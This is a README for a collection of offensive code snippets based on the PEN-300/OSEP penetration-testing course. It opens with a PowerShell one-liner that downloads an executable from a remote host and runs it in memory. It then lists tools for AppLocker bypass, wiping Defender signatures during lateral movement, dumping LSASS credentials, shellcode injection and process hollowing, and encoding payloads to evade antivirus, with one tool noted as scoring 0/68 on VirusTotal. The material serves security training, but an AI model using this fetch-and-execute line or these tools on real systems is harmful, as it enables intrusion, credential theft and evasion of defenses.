# OSEP Code Snippets
Code examples are provided as-is, without any form of warranty. Based on Offensive Security's [PEN-300](https://www.offensive-security.com/pen300-osep/) course.

Classes and methods are public, so most binaries should allow for reflective loading as below.

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/rev.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[rev.Program]::Main("".Split())
```

### Contents
|Snippet Name|Description|
|--|--|
| AppLocker Bypass PowerShell Runspace (C#) | Base binary for an applocker bypass using a combination of `CertUtil`, `BitsAdmin`, and `InstallUtil`. See `README.md` for details.|
| Fileless Lateral Movement (C#) | Wipes Windows Defender signatures on the remote host and uses a PSExec-like method (except using an existing process) to achieve lateral movement. Takes arguments for the target, the target service, and the target binary to run. Note that a non-critical service should be chosen, such as `SensorService`. |
|Linux Shellcode Encoder (Python) | Utility scripts to encode C# payloads from Linux, either ingesting a raw shellcode payload (.bin), or automatically feeding from 'msfvenom'. Supports XOR and ROT encoding with an arbitrary key, and prints the decoding function. Can be used to replace the C# ROT/XOR encoder scripts.|
|Linux Shellcode Loaders (C) |Various C-based shellcode loaders, including base binaries for library hijacking.|
|MiniDump (C# & PS1) |A simple binary to Dump LSASS to `C:\Windows\Tasks\lsass.dmp`. Also provided as native PowerShell script.|
|MSSQL (C#)|An example binary that includes a variety of discussed MSSQL interactions. Change the code to include only what you need.|
|PrintSpoofer.NET (C#)|Steals the token of the incoming authentication forced with the [PrintSpooler exploit](https://github.com/leechristensen/SpoolSample), and use that token to run a given binary. Modified to not require an interactive logon session. Takes arguments for the pipe name and binary to run.|
|ROT Shellcode Encoder (C#)|A simple binary to apply state-of-the-art ROT encoding to obfuscate the shellcode. It takes an argument for the number of rotations.|
|Sections Shellcode Process Injector (C#)|Injects and runs shellcode using `NtCreateSection`, `NtMapViewOfSection`, `NtUnMapViewOfsection` and `NtClose` instead of the "standard" method.|
|Shellcode Process Hollowing (C#)|Hollows a `svchost` process and runs the shellcode from there. Scores 0/68 on VirusTotal at the time of writing.|
|Shellcode Process Injector (C# & PS1) | Simple shellcode runner that applies process injection. Accepts an argument for the process to inject into. If no argument is given, it attempts to pick a suitable process based on privilege level. Also provided as native PowerShell script (though it is a bit simpler).|
|Simple Shellcode Runner (C# & PS1 & VBA)|The simplest of shellcode runners. Also provided as native PowerShell and VBA scripts.|
|XOR Shellcode Encoder (C#)|A simple binary to apply state-of-the-art XOR encoding to obfuscate the shellcode.|

